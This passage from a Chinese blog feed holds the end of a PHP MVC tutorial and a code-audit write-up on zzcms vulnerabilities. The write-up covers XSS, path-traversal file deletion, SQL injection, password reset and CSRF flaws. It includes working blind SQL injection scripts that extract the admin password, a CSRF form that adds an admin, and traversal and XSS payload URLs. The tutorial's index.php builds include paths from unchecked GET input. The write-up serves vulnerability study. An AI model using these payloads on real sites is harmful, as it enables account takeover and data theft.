上面貌似已经很cool了，但是显示什么样的内容是在控制器中直接指定的，希望内容也由URL指定，这样将数据的处理交给模型来处理。<br>model/model.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"><span class="comment">// model/model.php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">Model</span></span>&#123;</span></span><br><span class="line"><span class="php">  <span class="keyword">private</span> $data = <span class="keyword">array</span>(</span></span><br><span class="line"><span class="php">    <span class="string">'title'</span> =&gt; <span class="string">'Hello style'</span>,</span></span><br><span class="line"><span class="php">    <span class="string">'key'</span> =&gt; <span class="string">'welcome to style-404.github.io'</span>,</span></span><br><span class="line"><span class="php">  );</span></span><br><span class="line"><span class="php">  <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getData</span><span class="params">($key)</span></span>&#123;</span></span><br><span class="line"><span class="php">    <span class="keyword">return</span> <span class="keyword">$this</span> -&gt;data[$key];</span></span><br><span class="line"><span class="php">  &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>视图文件model.php定义了一个Model类，类中定义了一个getData()的方法，用于返回请求的数据。</p><p>同时修改入口文件index.php如下：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $c_str = $_GET[<span class="string">'c'</span>];  <span class="comment">// 获取控制器</span></span></span><br><span class="line"><span class="php"> $c_name = $c_str.<span class="string">'controller'</span>;</span></span><br><span class="line"><span class="php"> $c_path = <span class="string">'controller/'</span>.$c_name.<span class="string">'.php'</span>;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $method = $_GET[<span class="string">'a'</span>]; <span class="comment">//方法名</span></span></span><br><span class="line"><span class="php"> <span class="keyword">require</span>($c_path);</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">$param = $_GET[<span class="string">'param'</span>]; <span class="comment">// 增加参数</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"> $controller = <span class="keyword">new</span> $c_name;</span></span><br><span class="line"><span class="php"> $controller-&gt;$method($param);</span></span><br></pre></td></tr></table></figure><p>增加了一个参数$param，将其作为控制器的方法调用参数。</p><p>还需要修改控制器的方法根据不同参数取得不同的数据。<br>// controller/democontroller.php<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php"><span class="comment">// controller/democontroller.php</span></span></span><br><span class="line"><span class="php"><span class="class"><span class="keyword">class</span> <span class="title">DemoController</span></span></span></span><br><span class="line"><span class="php">&#123;</span></span><br><span class="line"><span class="php"></span></span><br><span class="line"><span class="php">    <span class="function"><span class="keyword">function</span> <span class="title">index</span><span class="params">($param)</span></span></span></span><br><span class="line"><span class="php">    &#123;</span></span><br><span class="line"><span class="php">    <span class="comment">// echo 'hello world';</span></span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'view/index.php'</span>);</span></span><br><span class="line"><span class="php">    <span class="keyword">require</span>(<span class="string">'model/model.php'</span>);</span></span><br><span class="line"><span class="php">    $model = <span class="keyword">new</span> Model();</span></span><br><span class="line"><span class="php">    $view = <span class="keyword">new</span> Index();</span></span><br><span class="line"><span class="php">    $data = $model-&gt;getData(<span class="keyword">$this</span>-&gt;$param);</span></span><br><span class="line"><span class="php">    $view-&gt;display($data);</span></span><br><span class="line"><span class="php">    &#125;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>访问<br><a href="http://localhost/index.php?c=demo&amp;a=index&amp;param=key" target="_blank" rel="noopener">http://localhost/index.php?c=demo&amp;a=index&amp;param=key</a><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jly1g1adw90p2nj30ex03ndfz.jpg" alt=""><br>成功~</p><h1 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h1><p><a href="https://www.awaimai.com/128.html" target="_blank" rel="noopener">https://www.awaimai.com/128.html</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> 开发 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>zzcms各版本审计之路</title>
      <link href="/2019/03/17/zzcms%E5%90%84%E7%89%88%E6%9C%AC%E5%AE%A1%E8%AE%A1%E4%B9%8B%E8%B7%AF/"/>
      <url>/2019/03/17/zzcms%E5%90%84%E7%89%88%E6%9C%AC%E5%AE%A1%E8%AE%A1%E4%B9%8B%E8%B7%AF/</url>
      
        <content type="html"><![CDATA[<h1 id="ZZCMS基础"><a href="#ZZCMS基础" class="headerlink" title="ZZCMS基础"></a>ZZCMS基础</h1><p>核心文件：<br>inc/fuction.php  全局函数文件<br>inc/config.php  常量配置文件<br>inc/conn.php    数据库连接配置文件,其中还包含了funcion.php功能函数及stopsqlin.php 过滤sql语句 对所有get post 等收到的数据进行消毒</p><p>在zzzms中的php文件中几乎都会包含conn.php check.php,check.php 是判断用户是否登入</p><p>adv.php 设置和修改广告词 包括对图片的修改与上传<br>adv2.php抢占广告位<br>zhadd.php  发展会 交给zhsave.php 处理<br>msg_manage.php 管理群发<br>msg.php 进行群发</p><p>ZZCMS的数据库<br>zzcms_ad  存储 抢占广告位的 信息<br>zzcms_zh 存储展会所属的用户的有关信息<br>zzcms_zhclass 存储展会的类别<br>zzcms_pp 存储 发布的品牌 及上传的图片的地址<br>zzcms_main  储存招商信息</p><h1 id="zzcms-8-2"><a href="#zzcms-8-2" class="headerlink" title="zzcms 8.2"></a>zzcms 8.2</h1><hr><p>前言:<br>ZZCMS 8.2可以说是学习代码审计的一个练手cms了 整个cms读通不需要花太多时间 而且本身也包含了很多漏洞 XXS sql注入 任意文件删除等等<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbj8dkcbj30wx0jbwho.jpg" alt=""></p><h2 id="XSS"><a href="#XSS" class="headerlink" title="XSS"></a>XSS</h2><p><strong>漏洞文件:</strong> /install/step_6.php</p><p><strong>漏洞原因:</strong>  没有进行安全过滤</p><p><strong>漏洞分析:</strong><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td1upkijj30jy04x74l.jpg" alt=""></p><p>在step6这里,会输出$admin $adminpwdtrue 这两个变量的值<br>然后在install/index.php,把数组中的键名直接注册为了变量<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td4pajtsj30ig05mt97.jpg" alt=""><br>通俗来讲就是如果POST一个admin = 1  就会把admin 注册为变量使用 且值为1<br>接着往下看 在switch语句中 如果到了步骤case 6 就会包含step_6.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0td9hsy62j30fk02cq2u.jpg" alt=""><br>在安装cms时只是依次判断,接着进行相应的包含,在数据的传递中没有进行安全处理<br><strong>漏洞复现:</strong><br>在/index.php中post相应的step的值会进行相应的文件包含<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdilpjm2j30yu0fqq5h.jpg" alt=""><br>成功触发XSS</p><p><strong>漏洞文件:</strong> /zx/show.php</p><p><strong>漏洞原因:</strong>  直接拼接,没有用引号包裹</p><p><strong>漏洞分析:</strong><br>zx目录是资讯页面 show.php 的功能是显示发布的资讯文章及对此文章进行评论<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0psobmnzrj30oo0ajaaz.jpg" alt=""><br>在23行起 先判断要取得文章id 然后从数据库取出 显示出来 其中 coutent 被取出来然后加入stripfxg()处理<br>跟进stripfxg() 在/inc/stopsqlin.php 其功能是还原被实体化的数据<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0tdos0hwij30sz03b74o.jpg" alt=""></p><p>继续用Seay审计系统在show.php对countent 进行追踪 发现调用showcontent和Payjf等方法,输出到页面上，但是这些方法没有对一些危险字符进行安全处理<br>这就造成了数据在进行实体化存入数据库然后还原成原来的数据没有进行过滤,会导致注入语句被成功执行<br><strong>漏洞复现</strong><br>在注册一个用户test 在发布资讯或者公司新闻 点击源码再发送XSS注入代码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pu8m3y8lj30ug0by75l.jpg" alt=""><br>发布成功之后点击浏览 发现成功触发JS<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0pud0oj3fj30z00bkwhn.jpg" alt=""></p><h2 id="任意文件删除"><a href="#任意文件删除" class="headerlink" title="任意文件删除"></a>任意文件删除</h2><p><strong>漏洞文件:</strong> /user/adv.php,/user/licence_save.php,/user/ppsave.php 等具有文件上传功能的文件</p><p><strong>漏洞原因:</strong> <strong>.</strong> 和 <strong>/</strong> 字符没有过滤而导致夸目录删除文件</p><p><strong>漏洞分析:</strong><br>在个人中心里面,有很多上传图片的功能及对图片进行修改，这些文件上传功能的代码几乎都没有进行过滤验证,就导致了夸目录删除文件<br>比如在 /user/ppsave.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rv0p9f8xj30jn060t91.jpg" alt=""></p><p>这里仅仅只是判断了oldimg 与img 是否相等 不相等就删除oldimg 而且 oldimg 与 img 是通过POST接收,只是trim一下没有进行任何对 . / 等危险字符进行过滤,而且进行伪造 过分相信了用户的输入</p><p><strong>漏洞复现:</strong><br>我们在个人中心 随便找一个 可以上传文件的页面 就拿adv.php 这个页面 我们点击修改 然后抓包 修改 oldimg 与img 为了便于测试 我们先建一个test文件夹 然后在里面新建一些文件</p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvkyevvrj30q609wgm2.jpg" alt=""></p><p>修改oldimg = test/test.txt<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rvo68hkij30xl0e8whl.jpg" alt=""></p><p>可以看到我们的test.txt 被删除了<br>在ZZcms8.2 版本中上传功能代码几号都是那样写的 这样就导致了很多有上传功能的文件 都是有漏洞的</p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p><strong>漏洞文件:</strong> /user/adv2.php CVE：CVE-2018-8967</p><p><strong>漏洞原因:</strong>  直接拼接,没有用引号包裹</p><p><strong>漏洞分析:</strong></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1ezsusdj30xc04e0t9.jpg" alt=""><br>在72行可看到 直接拼接POST进来的值且 没有用引号包裹 这就造成了虽然开头包含了过滤sql注入文件对所有get,post 进行消毒，但是又是直接拼接因为没有用引号包裹,所以不用单引号也可以直接进行sql注入。<br>要想进入这个语句,需要满足 $a+$c &gt;0<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r1r2v6ysj30oo0bbwfb.jpg" alt=""><br>即在zzcms_zh或者zzcms_main表查询到有记录</p><p><strong>漏洞复现:</strong></p><p>先确保  </p><ol><li>zzcms_zh或者zzcms_main表有数据 不然无法进入执行sql语句</li><li>zzcms_ad 表有数据 如果为空时 后面的盲注将不会有任何延迟</li></ol><p>我们先注册企业用户在个人中心点击抢占广告位(没有可登入后台进行添加) 然后点击抢占这个位置时进行抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r27u4oohj30zh0glacb.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r2b9fd30j310z0ahwg9.jpg" alt=""><br>可以看到 会POST一个id交给adv2.php,接下来构造盲注<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0r3grydu9j30zk0lcwhk.jpg" alt=""><br>右下角看到延迟10秒,说明执行成功 POC如下</p><pre><code>   import requestsimport timeurl = &quot;http://127.0.0.1/user/adv2.php?action=modify&quot;flag = &quot;&quot;for j in xrange(1,20):    for i in xrange(31,128):        payload = &quot;id=1 or if(select ascii(substr(pass,{num},1)) from zzcms_admin) = {index},sleep(5),1)%23&quot;.format(num=j,index=i)        strart_time = time.time()        r = requests.post(url,data=payload,headers={&quot;Content-Type&quot;:&quot;application/x-www-form-urlencoded&quot;})        end_time = time.time()        cost = end_time - strart_time        if cost &gt; 5:            flag +=chr(i)            print flag            breakprint &apos;flag is  %s &apos; % flag</code></pre><p><strong>漏洞文件:</strong> /dl/dl_sendmail.php<br><strong>漏洞原因:</strong> 直接拼接进sql语句中 没有进行过滤 使用危险函数stripfxg()<br><strong>CVE:</strong> CVE-2018-9309<br><strong>漏洞分析:</strong><br>此文件是给代理发邮件时会将数据发送给dl_sendmail.php处理<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rxagjqpzj30vd0b4mym.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5akoqmj30kd03i74f.jpg" alt=""><br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry5vw7zrj30hj02kdfu.jpg" alt=""><br>从POST接受过来的sql 进行stripfxg()处理然后赋给了session 最后拼接 执行sql语句，且没有用号包裹,在之前就分析分析过这个方法<br>这是将被转义的字符还原 简单来说就是 输入 ‘ 如果经过转义 到数据库会变为 ‘\ 取出来查看是否进过转义 还原为 ‘ 呈现给用户<br>使用了这个危险函数stripfxg() 他可以将全局过滤还原成正常的数据，如果这个数据带入了sql查询中，会直接造成注入的。<br><strong>漏洞复现:</strong><br>进行复现时要保证 zzcms_msg 有数据 且 有个elite 属性值为1<br>点击发邮件 然后抓包 修改sql 内容<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ry1bz3waj30zk0lcdj1.jpg" alt=""></p><p>这里我用的盲注,可看到成功延迟10秒</p><p><strong>漏洞文件:</strong> www/user/del.php<br><strong>漏洞原因:</strong> 直接拼接进sql语句中<br><strong>CVE:</strong> CVE-2018-9309<br><strong>漏洞分析:</strong><br>将del.php 放入Seay审计系统可清楚的知道此文件有哪些变量 方便进行审计<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ojmhuoe9j30v10ii40o.jpg" alt=""><br>首先对传入的pagename,tablename 进行了简单去空处理 id 被chekid()函数进行了处理,找到checkid()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0okeij9dcj30o805v3z2.jpg" alt=""><br>对id进行了过滤，接着在switch语句中 sql语句只有对id进行拼接操作 也不存在sql注入  接着往下看 当$tablename不满足if和elseif 的条件的时候,发现我们传入的tablename 直接被拼接到了sql语句当中并且tablename变量也没有用单引号包裹 没有进行任何过滤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0otawhn3tj30ky0440sx.jpg" alt=""><br><strong>漏洞复现:</strong><br>先注册一个账户 test(不用注册登入也是可以进行注入的) 然后点击发公司新闻先发布一条信息，在数据库查看 发现 已经存入数据库当中<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0on1hdm00j30w509jgn1.jpg" alt=""><br>接下来我们再删除这条信息的时候抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0op1fek6sj30kw08g0tf.jpg" alt=""><br>看到  删除的时候会将tablename 发送给del.php 处理 于是构造sql注入<br>post:<br><figure class="highlight lsl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=<span class="number">1</span>&amp;tablename=zzcms_zx where id=<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span> and if((ascii(substr(user(),<span class="number">1</span>,<span class="number">1</span>)) = <span class="number">114</span>),sleep(<span class="number">10</span>),<span class="number">1</span>)#</span><br></pre></td></tr></table></figure></p><p>用union语句 以免因为前面的select 语句为空而注入失败<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0opyuds18j30z50d30uq.jpg" alt=""><br>右下角显示延迟10 秒 说明成功注入<br>这里需要注意 不能用 大于号和小于号 前面已经说过这个cms会在 inc/stopsqlin.php 中 用addslashes()、htmlspecialchars() 对get 和 post 过来的值进行处理<br>POC如下 py2环境下成功运行<br><figure class="highlight maxima"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">import <span class="built_in">time</span></span><br><span class="line"></span><br><span class="line">url = <span class="string">"http://127.0.0.1/user/del.php"</span></span><br><span class="line">flag = <span class="string">""</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">xrange</span>(<span class="number">1</span>,<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">xrange</span>(<span class="number">31</span>,<span class="number">128</span>):</span><br><span class="line">        payload = <span class="string">"id=1&amp;tablename=zzcms_zx where id=1 union select 1,2 and if(ascii(substr(database(),&#123;num&#125;,1)) = &#123;index&#125;,sleep(5),1)%23"</span>.format(<span class="built_in">num</span>=j,index=i)</span><br><span class="line"></span><br><span class="line">        strart_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line">        r = requests.post(url,data=payload,headers=&#123;<span class="string">"Content-Type"</span>:<span class="string">"application/x-www-form-urlencoded"</span>&#125;)</span><br><span class="line">        end_time = <span class="built_in">time</span>.<span class="built_in">time</span>()</span><br><span class="line"></span><br><span class="line">        cost = end_time - strart_time</span><br><span class="line">        <span class="keyword">if</span> cost &gt; <span class="number">5</span>:</span><br><span class="line">            flag +=chr(i)</span><br><span class="line">            <span class="built_in">print</span> flag</span><br><span class="line">            <span class="built_in">break</span></span><br><span class="line"><span class="built_in">print</span> 'flag <span class="built_in">is</span>  <span class="built_in">%s</span> ' <span class="symbol">%</span> flag</span><br></pre></td></tr></table></figure></p><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0ote7zwxhj311x0ivgn9.jpg" alt=""></p><p><strong>漏洞文件:</strong> /user/check.php<br><strong>漏洞原因:</strong> getip()中没有进行过滤</p><p><strong>漏洞分析:</strong><br>check.php 是个检查用户登入状态文件 很多文件都包含此文件<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz5sguycj30s504adgm.jpg" alt=""><br>这行sql语句调用了getip()来获取ip值,接着看看这个函数<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0rz8zgypvj30sq085t9t.jpg" alt=""><br>发现只是单纯的从HTTP直接换取ip值 没有进行过滤 接下来进行XFF注入</p><p><strong>漏洞复现:</strong><br>只要包含了check.php 都可以进行XFF注入<br>X-Forwarded-For’:1’or sleep(7)</p><h2 id="任意用户密码修改"><a href="#任意用户密码修改" class="headerlink" title="任意用户密码修改"></a>任意用户密码修改</h2><p><strong>漏洞文件:</strong> /one/getpassword.php<br><strong>漏洞分析:</strong><br>getpassword.php 是用来找回密码功能的文件代码<br>通过判断$action的值来进行相应的步骤<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbovb4psj30u9042gly.jpg" alt=""><br>在73行起 如果$action=step3 <code>$_SESSION[&#39;username&#39;]</code> 不为空 然后就进行update操作<br><code>$_SESSION[&#39;username&#39;]</code>又是从step1 中 post传递过来的 username，就导致了username可控<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sbtwhnfcj30mc06hjs5.jpg" alt=""></p><p><strong>漏洞复现:</strong><br>首先第一步 先输入要找回密码的用户名 点击下一步时抓包<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0sc9fo7o4j30rv0f9q49.jpg" alt=""><br>这样就有了session值<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scjo9xtlj30j8090gm9.jpg" alt=""></p><p>然后将action改为step3 修改POST数据 password的值就是修改的密码<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0scr3b20cj30z20d076i.jpg" alt=""><br>可以看到 test用户密码修改成功 然后进行登入 登入成功</p><h1 id="ZZCMS-8-3"><a href="#ZZCMS-8-3" class="headerlink" title="ZZCMS 8.3"></a>ZZCMS 8.3</h1><p>首先看官网对之前版本的处理<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4d3irxcj30tt0940tr.jpg" alt=""></p><p>虽然更新到8.3 但是还是存在很多 漏洞  有些在8.2存在的漏洞在8.3也没有解决<br>所以很多漏洞在8.2版本也就有了<br>可以看到 <strong>/dl/dl_sendmail.php</strong> 这个sql漏洞在8.3还存在</p><h2 id="CSRF"><a href="#CSRF" class="headerlink" title="CSRF"></a>CSRF</h2><p>其实这个也在8.2存在,整个CMS管理后台设计操作的表单没有设置token验证，导致了可以进行夸站请求伪造</p><p><strong>漏洞复现:</strong><br><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">&lt;html&gt;</span></span><br><span class="line">  <span class="symbol">&lt;body&gt;</span></span><br><span class="line">  <span class="symbol">&lt;script&gt;</span><span class="keyword">history</span>.pushState(<span class="string">''</span>, <span class="string">''</span>, <span class="string">'/'</span>)&lt;/script&gt;</span><br><span class="line">    &lt;form action=<span class="string">"http://127.0.0.1/test/adminadd.php?action=add"</span> method=<span class="string">"POST"</span>&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"groupid"</span> value=<span class="string">"1"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"admins"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"passs"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"hidden"</span> name=<span class="string">"passs2"</span> value=<span class="string">"123"</span> /&gt;</span><br><span class="line">      &lt;<span class="built_in">input</span> <span class="built_in">type</span>=<span class="string">"submit"</span> value=<span class="string">"Submit request"</span> /&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">  &lt;/body&gt;</span><br><span class="line">&lt;/html</span><br></pre></td></tr></table></figure></p><p>如果管理员点击,就会添加管理员用户</p><h1 id="ZZCMS-2018"><a href="#ZZCMS-2018" class="headerlink" title="ZZCMS 2018"></a>ZZCMS 2018</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10aywgajbj30hv04qq30.jpg" alt=""></p><h2 id="任意文件删除漏洞"><a href="#任意文件删除漏洞" class="headerlink" title="任意文件删除漏洞"></a>任意文件删除漏洞</h2><p>CVE-2019-8411<br> <strong>漏洞文件</strong> /admin/dl_data.php<br> <strong>漏洞分析</strong><br> 看到这个这个漏洞,我再回过头看8.2和8.3 版本 的源代码 发现原来是早就在8.2存在的漏洞</p><p> <img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z6cbmz8gj30lx059dg2.jpg" alt=""></p><p> 直接从get获取filename的值 拼接到$fp 也没有用单引号包裹 然后直接进行文件删除</p><p> <strong>漏洞复现:</strong></p><p> 首先在wwww目录下新建test目录,在test目录下建一个yang.txt文件，然后在浏览器输入</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:<span class="regexp">//</span><span class="number">127.0</span>.<span class="number">0.1</span><span class="regexp">/admin/</span>dl_data.php?action=del&amp;filename=..<span class="regexp">/test/y</span>ang.txt</span><br></pre></td></tr></table></figure><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g10ax6sndqj30z60a0q43.jpg" alt=""><br>发现,yang.txt已经被删除了</p><h1 id="zzcms-2019"><a href="#zzcms-2019" class="headerlink" title="zzcms 2019"></a>zzcms 2019</h1><p><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g0z4uz95rej30ws06i3zc.jpg" alt=""><br>在对2019版本随便测试了一下<br>发现2019版本还是有一部分在8.2存在的XSS漏洞漏洞还没修复</p><h2 id="xss"><a href="#xss" class="headerlink" title="xss"></a>xss</h2><p>这个存储型xss注入漏洞 是在前不久爆出来的 比cms官网写的最新更新时间晚  说明这个漏洞还没修复,可是当我去官网下载这个cms进行复现时复现不了 发现已经被悄悄修复了 哼~  所以只能讲下原理</p><p><strong>漏洞文件</strong> /user/ask.php // 这是个发问答的功能文件<br><strong>漏洞分析</strong><br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="php"><span class="meta">&lt;?php</span></span></span><br><span class="line"><span class="php">$do=<span class="keyword">isset</span>($_GET[<span class="string">'do'</span>])?$_GET[<span class="string">'do'</span>]:<span class="string">''</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">switch</span> ($do) &#123;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"add"</span>:add();<span class="keyword">break</span>;</span></span><br><span class="line"><span class="php"><span class="keyword">case</span> <span class="string">"modify"</span>:modify();<span class="keyword">break</span>;</span></span><br><span class="line"><span class="php">&#125;</span></span><br></pre></td></tr></table></figure></p><p>找到modify()<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1662802twj30ps0b9myk.jpg" alt=""><br>再跟进markit() 在 /inc/function.php<br><img src="https://ws1.sinaimg.cn/large/005RaR9Jgy1g1664mp70aj30zp03n74n.jpg" alt=""></p><p>可以看到,这个url 没有进行 过滤 直接插入到了 语句中<br>接下来在url中构造xss代码<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">url<span class="meta-keyword">/to/</span>zzmcs<span class="meta-keyword">/user/</span>ask.php?do=modify<span class="variable">&amp;page</span>=<span class="number">1</span><span class="variable">&amp;id</span>=<span class="number">1</span><span class="variable">&amp;aaa</span>=<span class="params">&lt;sCrIpT&gt;</span>alert(<span class="meta-keyword">/xss/</span>)<span class="params">&lt;/ScRiPt&gt;</span></span><br></pre></td></tr></table></figure></p><p>当管理员访问后台查看不良数据时会触发XSS漏洞</p><h1 id="代码审计经验"><a href="#代码审计经验" class="headerlink" title="代码审计经验"></a>代码审计经验</h1><p>在分析cms 或者是很长的代码时 用seay 等审计系统进行追踪调试 更方便清晰<br>对用户可控的数据 利用审计系统进行追踪 看看进行了哪些包装过滤,并分析这些函数是否有漏洞可绕过<br>关注 功能代码，配置文件，比如看看过滤sql注入功能的代码 数据库连接时是否出现漏洞<br>分析各类漏洞可能使用的危险函数,寻找这些能够产生漏洞的函数进行分析 比如unlink(),fread(),eval(),preg_replace(),query()等等<br>查看是否存在逻辑漏洞，比如 程序是否可以重复安装 ，修改密码是否存在越权修改其他用户密码，找回密码验证码是否可以暴力破解, 验证存在绕过<br>要学会经常复现 复现会遇到问题 你的问题有可能与别人的不一样 你测试成功payload语句和poc也有可能与别人不一样<br>在进行对某个cms进行审计时 可以去看看这个cms官网的历史更新版本即历史漏洞,</p>]]></content>
      
      
      
        <tags>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>php_bugs(php代码审计基础)</title>
      <link href="/2019/03/16/php-bugs-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/"/>
      <url>/2019/03/16/php-bugs-php%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E5%9F%BA%E7%A1%80/</url>
      
